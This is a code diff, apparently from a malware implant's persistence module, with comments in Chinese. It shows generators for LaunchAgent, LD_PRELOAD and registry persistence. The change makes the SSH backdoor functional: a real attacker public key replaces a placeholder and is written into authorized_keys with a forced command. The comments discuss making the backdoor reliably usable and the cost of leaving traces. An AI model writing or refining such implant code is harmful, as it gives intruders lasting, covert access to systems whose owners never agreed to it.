@@ -37,10 +37,48 @@ static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
 static size_t gen_ldpreload(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap, "%s\n", arg ? arg : "/tmp/.agent.so");
 }
+/* 要写入 authorized_keys 的完整公钥行（<type> <base64> [comment]）。
+ *
+ * 为什么必须是"整行"而不是只传 blob：
+ *   类型前缀（ssh-rsa / ssh-ed25519 / ecdsa-sha2-*）与 base64 blob 必须匹配，
+ *   写死 "ssh-rsa " 前缀去接一个 ed25519 blob 会让 OpenSSH 拒绝整行 ——
+ *   表现为"驻留装上了、看起来成功、但永远登不进去"，比不装更糟：
+ *   消耗一次写入动作、留下痕迹、零收益。
+ *
+ * 为什么未设置时拒绝生成（返回 0）而不是回落占位 key：
+ *   占位 key 无法认证，等价于上述失败模式，且更难排查。
+ *
+ * 单线程假设：implant 内无并发调用。 */
+static char g_ssh_pub[1024];
+
+int persist_sshkey_pubkey(const char *line)
+{
+    size_t i, n;
+    if (!line) return -1;
+    n = strlen(line);
+    if (n == 0 || n >= sizeof g_ssh_pub) return -1;
+    /* 必须单行：多行会把后续内容变成 authorized_keys 的独立条目 */
+    if (strchr(line, '\n') || strchr(line, '\r')) return -1;
+    /* 必须带类型前缀，且与 blob 之间有空格 */
+    if (strncmp(line, "ssh-", 4) != 0 &&
+        strncmp(line, "ecdsa-", 6) != 0 &&
+        strncmp(line, "sk-",   3) != 0) return -1;
+    if (!strchr(line, ' ')) return -1;
+    for (i = 0; i < n; i++)
+        if (line[i] < 0x20 || line[i] > 0x7e) return -1;
+    memcpy(g_ssh_pub, line, n + 1);
+    return 0;
+}
+
 static size_t gen_sshkey(const char *arg, char *out, size_t cap) {
-    return (size_t)snprintf(out, cap,
-        "command=\"%s\" ssh-rsa AAAAB3NzaC1yc2EAAAA placeholder-agent-key\n",
-        arg ? arg : "true");
+    /* 未注入真实公钥 -> 拒绝生成，绝不写入无法认证的占位 key */
+    if (!g_ssh_pub[0]) return 0;
+    /* forced command 含引号/换行会破坏 authorized_keys 语法，
+     * 后果是整行失效甚至影响该用户其它合法条目 */
+    if (arg && (strchr(arg, '"') || strchr(arg, '\n') || strchr(arg, '\r')))
+        return 0;
+    return (size_t)snprintf(out, cap, "command=\"%s\" %s\n",
+                            arg ? arg : "true", g_ssh_pub);
 }
 static size_t gen_registry(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
